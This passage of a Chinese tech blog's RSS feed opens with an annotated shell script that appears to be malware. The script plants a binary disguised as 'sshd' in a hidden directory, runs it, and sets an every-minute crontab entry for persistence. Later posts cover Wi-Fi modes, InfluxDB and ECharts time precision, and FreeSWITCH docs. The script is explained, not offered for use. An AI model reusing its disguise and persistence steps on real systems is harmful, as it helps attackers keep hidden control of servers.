&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp -f -- &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;uname -m&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# uname -m获取系统架构，然后判断要把i686还是x86_64拷贝到.sshd目录, 并重命名为sshd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;/&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; $ARGS -f -c &lt;span style=&#34;color:#75715e&#34;&gt;# 执行改名后的文件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 生成后续执行的脚本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd -- &lt;/span&gt;$DIR&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;mkdir -- .&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cp -f -- `uname -m` .&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./.&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$ARGS&lt;span style=&#34;color:#e6db74&#34;&gt; -c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rm -rf .&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod +x -- &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 执行脚本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 生成计划任务执行脚本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;* * * * * `pwd`/&lt;/span&gt;$EXEC&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | sort - | uniq - | crontab -
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 删除go脚本&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm -rf go
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上文的脚本中，有许多命令后跟着 &lt;code&gt;--&lt;/code&gt;  和 &lt;code&gt;-&lt;/code&gt;  这两个参数都是 bash 脚本的内置参数，用来标记命令的内置参数已经结束。&lt;/p&gt;</description>
    </item>
    <item>
      <title>进程实战</title>
      <link>https://wdd.js.org/posts/2019/12/drkxqu/</link>
      <pubDate>Wed, 18 Dec 2019 09:10:04 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/12/drkxqu/</guid>
      <description></description>
    </item>
    <item>
      <title>docker slim</title>
      <link>https://wdd.js.org/posts/2019/12/caytlk/</link>
      <pubDate>Sat, 14 Dec 2019 11:32:27 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/12/caytlk/</guid>
      <description></description>
    </item>
    <item>
      <title>wifi工作模式测试</title>
      <link>https://wdd.js.org/posts/2019/12/mgyw98/</link>
      <pubDate>Thu, 12 Dec 2019 10:11:47 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/12/mgyw98/</guid>
      <description>&lt;p&gt;路由器无线网络的模式有11b only ,11g only, 11n only,11bg mixed,11bgn mixed&lt;/p&gt;
&lt;p&gt;11b：就是11M &lt;!-- raw HTML omitted --&gt;11g：就是54M &lt;!-- raw HTML omitted --&gt;11n：就是150M或者300M &lt;!-- raw HTML omitted --&gt;only：在此模式下，频道仅使用 802.11b标准&lt;!-- raw HTML omitted --&gt;mixed：支持混合 802.11b 和 802.11g 装置&lt;/p&gt;
&lt;p&gt;修改路由器工作模式后，手机连接wifi，然后用腾讯手机管家对WiFi测速&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;工作模式&lt;/th&gt;
          &lt;th&gt;下载速度&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;11b&lt;/td&gt;
          &lt;td&gt;200kb/s&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;11g&lt;/td&gt;
          &lt;td&gt;400kb/s&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;11n&lt;/td&gt;
          &lt;td&gt;1.1MB/s&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;11bgn mixed&lt;/td&gt;
          &lt;td&gt;2.06MB/s&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;所以，选择11bgn是个不错的选择。&lt;/p&gt;</description>
    </item>
    <item>
      <title>influxdb时间精度到秒</title>
      <link>https://wdd.js.org/posts/2019/12/nolg61/</link>
      <pubDate>Wed, 11 Dec 2019 17:48:20 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/12/nolg61/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;var&lt;/span&gt; data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;var&lt;/span&gt; t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:13:06.078545239Z&amp;#34;&lt;/span&gt;,153&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:14:06.087484224Z&amp;#34;&lt;/span&gt;,118&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:15:07.723571286Z&amp;#34;&lt;/span&gt;,198&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:16:09.534879791Z&amp;#34;&lt;/span&gt;,249&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;var&lt;/span&gt; t2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:13:06Z&amp;#34;&lt;/span&gt;,153&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:14:06Z&amp;#34;&lt;/span&gt;,118&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:15:07Z&amp;#34;&lt;/span&gt;,198&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2019-12-11T09:16:09Z&amp;#34;&lt;/span&gt;,249&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;var&lt;/span&gt; data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; t1.map&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;item&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        value: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;item&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, item&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;option &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    title: &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        text: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;动态数据 + 时间坐标轴&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tooltip: &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        trigger: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;axis&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    xAxis: &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        type: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;time&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    yAxis: &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        type: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    series: &lt;span style=&#34;color:#f92672&#34;&gt;[{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;模拟数据&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        type: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;line&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        showSymbol: false,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hoverAnimation: false,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        data: data
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;数据集t1时间精度到秒，并且带9位小数&lt;/li&gt;
&lt;li&gt;数据集t2时间精确到秒，不带小数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;t1的绘线出现往回拐，明显有问题。不知道这是不是echars的bug&lt;/p&gt;</description>
    </item>
    <item>
      <title>通道变量列表</title>
      <link>https://wdd.js.org/freeswitch/channel-var-list/</link>
      <pubDate>Tue, 10 Dec 2019 11:33:24 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/channel-var-list/</guid>
      <description>&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;about&#34;&gt;About&lt;/h1&gt;
&lt;p&gt;Channel variables are used to manipulate dialplan execution, to control call progress, and to provide options to applications. They play a pervasive role, as FreeSWITCH™ frequently consults channel variables as a way to customize processing prior to a channel&amp;rsquo;s creation, during call progress, and after the channel hangs up. &lt;!-- raw HTML omitted --&gt; Click here to expand Table of Contents
&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>mod_commands</title>
      <link>https://wdd.js.org/freeswitch/mod-command/</link>
      <pubDate>Tue, 10 Dec 2019 11:32:38 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/mod-command/</guid>
      <description>&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;usage&#34;&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;clihttpsfreeswitchorgconfluencepluginsservletmobilecontentid1966741contentview1048948&#34;&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048948&#34;&gt;CLI&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;See below.
&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;apievent-interfaces&#34;&gt;&lt;strong&gt;API/Event Interfaces&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048924&#34;&gt;mod_event_socket&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048926&#34;&gt;mod_erlang_event&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048928&#34;&gt;mod_xml_rpc&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;scripting-interfaces&#34;&gt;&lt;strong&gt;Scripting Interfaces&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048930&#34;&gt;mod_perl&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048935&#34;&gt;mod_v8&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048940&#34;&gt;mod_python&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048944&#34;&gt;mod_lua&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;from-the-dialplanhttpsfreeswitchorgconfluencepluginsservletmobilecontentid1966741contentview1048645&#34;&gt;&lt;strong&gt;From the&lt;/strong&gt; &lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/1048645&#34;&gt;Dialplan&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;An &lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/30867723&#34;&gt;API command&lt;/a&gt; can be called from the dialplan. Example:&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;Invoke API Command From Dialplan&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;Other examples:&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;Other Dialplan API Command Examples&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://freeswitch.org/confluence/plugins/servlet/mobile?contentId=1966741#content/view/30867723&#34;&gt;API commands&lt;/a&gt; with multiple arguments usually have the arguments separated by a space:&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;Multiple Arguments&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>XML Switch Configuration</title>
      <link>https://wdd.js.org/freeswitch/xml-config/</link>
      <pubDate>Tue, 10 Dec 2019 11:30:38 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/xml-config/</guid>
      <description>&lt;p&gt;The FreeSWITCH core configuration is contained in &lt;a href=&#34;http://git.freeswitch.org/git/freeswitch/tree/conf/vanilla/autoload_configs/switch.conf.xml&#34;&gt;autoload_configs/switch.conf.xml&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;default-key-bindings&#34;&gt;&lt;strong&gt;Default key bindings&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Function keys can be mapped to API commands using the following configuration:&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;The default keybindings are;&lt;!-- raw HTML omitted --&gt;F1 = help&lt;!-- raw HTML omitted --&gt;F2 = status&lt;!-- raw HTML omitted --&gt;F3 = show channels&lt;!-- raw HTML omitted --&gt;F4 = show calls&lt;!-- raw HTML omitted --&gt;F5 = sofia status&lt;!-- raw HTML omitted --&gt;F6 = reloadxml&lt;!-- raw HTML omitted --&gt;F7 = console loglevel 0&lt;!-- raw HTML omitted --&gt;F8 = console loglevel 7&lt;!-- raw HTML omitted --&gt;F9 = sofia status profile internal&lt;!-- raw HTML omitted --&gt;F10 = sofia profile internal siptrace on&lt;!-- raw HTML omitted --&gt;F11 = sofia profile internal siptrace off&lt;!-- raw HTML omitted --&gt;F12 = version&lt;!-- raw HTML omitted --&gt;Beware that the option loglevel is actually setting the minimum hard_log_Level in the application. What this means is if you set this to something other than DEBUG no matter what log level you set the console to one you start up you will not be able to get any log messages below the level you set. Also be careful of mis-typing a log level, if the log level is not correct it will default to a hard_log_level of 0. This means that virtually no log messages will show up anywhere.
&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Sofia SIP Stack</title>
      <link>https://wdd.js.org/freeswitch/sofia-stack/</link>
      <pubDate>Tue, 10 Dec 2019 11:27:17 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/sofia-stack/</guid>
      <description>&lt;p&gt;Sofia is a SIP stack used by FreeSWITCH.&lt;!-- raw HTML omitted --&gt; When you see &amp;ldquo;sofia&amp;rdquo; anywhere in your configuration, think &amp;ldquo;This is SIP stuff.&amp;rdquo; It takes a while to master it all, so please be patient with yourself. SIP is a crazy protocol and it will make you crazy too if you aren&amp;rsquo;t careful. Read on for information on setting up SIP/Sofia in your FreeSWITCH configuration.&lt;/p&gt;
&lt;p&gt;mod_sofia exposes the Sofia API and sets up the FreeSWITCH SIP endpoint.
&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>编译FS</title>
      <link>https://wdd.js.org/freeswitch/compile-fs/</link>
      <pubDate>Tue, 10 Dec 2019 11:25:04 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/compile-fs/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;make clean - Cleans the build environment&lt;/li&gt;
